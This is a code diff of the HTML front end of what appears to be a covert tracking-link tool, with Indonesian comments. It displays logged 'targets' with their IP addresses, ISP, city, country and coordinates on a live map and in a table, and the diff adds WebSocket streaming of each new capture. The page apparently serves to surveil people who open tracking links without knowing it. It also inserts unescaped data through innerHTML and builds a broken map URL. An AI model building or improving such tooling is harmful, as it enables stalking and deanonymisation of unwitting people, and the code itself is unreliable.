@@ -3,32 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>:: REAL-TIME TRACKING LOGS v3.9 ::</title>
+    <title>:: LIVE TRACKING LOGS v4.0 ::</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style> 
         #map { height: 400px; width: 100%; margin-top: 20px; border: 1px solid #0f0; } 
+        .log-table-container { max-height: 500px; overflow-y: auto; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="container full-width">
-        <h1 class="main-title">> TRACKING_LOGS.DAT (REAL-TIME)</h1>
+        <h1 class="main-title">> TRACKING_LOGS.DAT (LIVE MAP)</h1>
         <div class="nav-links">
             <a href="/dashboard.html">[ << BACK TO DASHBOARD ]</a>
-            <a href="#" id="refresh-btn">[ MANUAL REFRESH ]</a>
         </div>
         
         <div id="map"></div>
-        <div id="log-section"><p class="highlight">> Initializing real-time log stream...</p></div>
+        <div class="log-table-container">
+            <table class="hacker-table">
+                <thead>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Target ID</th>
+                        <th>Link ID</th>
+                        <th>IP Address</th>
+                        <th>ISP</th>
+                        <th>City</th>
+                        <th>Country</th>
+                        <th>Coords</th>
+                    </tr>
+                </thead>
+                <tbody id="log-body">
+                    </tbody>
+            </table>
+        </div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const logSection = document.getElementById('log-section');
+        const logBody = document.getElementById('log-body');
         let map;
         let markersLayer = L.layerGroup();
 
+        // Fungsi untuk menambahkan satu penanda (marker) ke peta
+        function addMarkerToMap(loc) {
+            if (!loc || typeof loc.latitude === 'undefined' || typeof loc.longitude === 'undefined') return;
+            const locationString = (loc.city && loc.country) ? `${loc.city}, ${loc.country}` : 'Location unknown';
+            const marker = L.marker([loc.latitude, loc.longitude]);
+            marker.bindPopup(`<b>${loc.username}</b><br>
+                ${new Date(loc.created_at).toLocaleString('id-ID')}<br>
+                ${locationString}<br>
+                IP: ${loc.ip_address}<br>
+                ISP: ${loc.isp || 'N/A'}`);
+            markersLayer.addLayer(marker);
+        }
+
+        // Fungsi untuk menambahkan satu baris ke tabel
+        function addRowToTable(loc) {
+            const mapUrl = `https://www.google.com/maps?q=$${loc.latitude},${loc.longitude}`;
+            const newRow = document.createElement('tr');
+            newRow.innerHTML = `
+                <td>${new Date(loc.created_at).toLocaleString('id-ID')}</td>
+                <td class="highlight">${loc.username}</td>
+                <td>${loc.tracker_id}</td>
+                <td>${loc.ip_address}</td>
+                <td>${loc.isp || 'N/A'}</td>
+                <td class="highlight">${loc.city || 'N/A'}</td>
+                <td class="highlight">${loc.country || 'N/A'}</td>
+                <td><a href="${mapUrl}" target="_blank">View Map</a></td>
+            `;
+            // Tambahkan baris baru di paling atas
+            logBody.prepend(newRow);
+        }
+
+        // Fungsi untuk memuat semua data historis saat halaman dibuka
+        async function fetchInitialLogs() {
+            try {
+                const res = await fetch('/api/locations');
+                const rows = await res.json();
+                if (!rows || !rows.length) return;
+
+                rows.forEach(row => {
+                    addMarkerToMap(row);
+                    addRowToTable(row);
+                });
+
+                if (markersLayer.getLayers().length > 0) {
+                    map.fitBounds(markersLayer.getBounds());
+                }
+            } catch (error) {
+                console.error("Gagal memuat log awal:", error);
+            }
+        }
+
+        // Inisialisasi Peta
         function initMap() {
             if (!map) {
                 map = L.map('map').setView([-2.5489, 118.0149], 5); // Center on Indonesia
@@ -39,80 +108,27 @@
             }
         }
 
-        async function fetchLogs() {
-            logSection.innerHTML = "<p class='highlight'>> Fetching latest data from server...</p>";
-            markersLayer.clearLayers();
-            try {
-                const res = await fetch('/api/locations');
-                const rows = await res.json();
+        // --- Logika Real-time ---
+        const socket = io();
 
-                if (!rows || !rows.length) {
-                    logSection.innerHTML = "<p class='error'>> NO LOG DATA FOUND.</p>";
-                    return;
-                }
+        socket.on('connect', () => console.log('✅ Terhubung ke log stream via WebSocket!'));
 
-                let html = `<table class="hacker-table">
-                    <thead><tr>
-                        <th>Timestamp</th>
-                        <th>Target ID</th>
-                        <th>Link ID</th>
-                        <th>IP Address</th>
-                        <th>City</th>
-                        <th>Country</th>
-                        <th>User Agent</th>
-                        <th>Coords</th>
-                    </tr></thead><tbody>`;
-                
-                rows.forEach(r => {
-                    const mapUrl = `https://www.google.com/maps?q=${r.latitude},${r.longitude}`;
-                    html += `<tr>
-                        <td>${new Date(r.created_at).toLocaleString('id-ID')}</td>
-                        <td class="highlight">${r.username}</td>
-                        <td>${r.tracker_id}</td>
-                        <td>${r.ip_address}</td>
-                        <td class="highlight">${r.city || 'N/A'}</td>
-                        <td class="highlight">${r.country || 'N/A'}</td>
-                        <td class="user-agent">${r.user_agent}</td>
-                        <td><a href="${mapUrl}" target="_blank">View Map</a></td>
-                    </tr>`;
-                    
-                    const locationString = (r.city && r.country) ? `${r.city}, ${r.country}` : 'Location unknown';
-                    const marker = L.marker([r.latitude, r.longitude]).addTo(markersLayer);
-                    marker.bindPopup(`<b>${r.username}</b><br>${new Date(r.created_at).toLocaleString()}<br>${locationString}<br>IP: ${r.ip_address}`);
-                });
-                html += "</tbody></table>";
-                logSection.innerHTML = html;
-                
-                if (rows.length > 0) {
-                    map.fitBounds(markersLayer.getBounds());
-                }
-
-            } catch (error) {
-                logSection.innerHTML = `<p class="error">> FAILED TO FETCH LOGS: ${error.message}</p>`;
-            }
-        }
-
-        // --- Logika Tombol & Real-time ---
-
-        // 1. Event listener untuk tombol refresh manual
-        document.getElementById('refresh-btn').addEventListener('click', (e) => {
-            e.preventDefault(); // Mencegah link pindah halaman
-            console.log('Manual refresh requested.');
-            fetchLogs();
+        // DENGARKAN EVENT BARU 'new_location_logged'
+        socket.on('new_location_logged', (newLocation) => {
+            console.log('📍 Lokasi baru diterima secara real-time:', newLocation);
+            
+            // Tambahkan marker dan baris tabel baru
+            addMarkerToMap(newLocation);
+            addRowToTable(newLocation);
+            
+            // Pindahkan peta ke lokasi terbaru
+            map.panTo([newLocation.latitude, newLocation.longitude]);
         });
         
-        // 2. Event listener untuk update real-time dari server
-        const socket = io();
-        socket.on('connect', () => console.log('✅ Terhubung ke log stream via WebSocket!'));
-        socket.on('dashboard_update', () => {
-            console.log('🔄 Real-time update received from server. Fetching new logs...');
-            fetchLogs(); // Otomatis panggil fungsi fetchLogs saat ada update
-        });
-
-        // 3. Muat data pertama kali saat halaman dibuka
+        // Muat data pertama kali saat halaman dibuka
         document.addEventListener('DOMContentLoaded', () => {
             initMap();
-            fetchLogs();
+            fetchInitialLogs();
         });
     </script>
 </body>
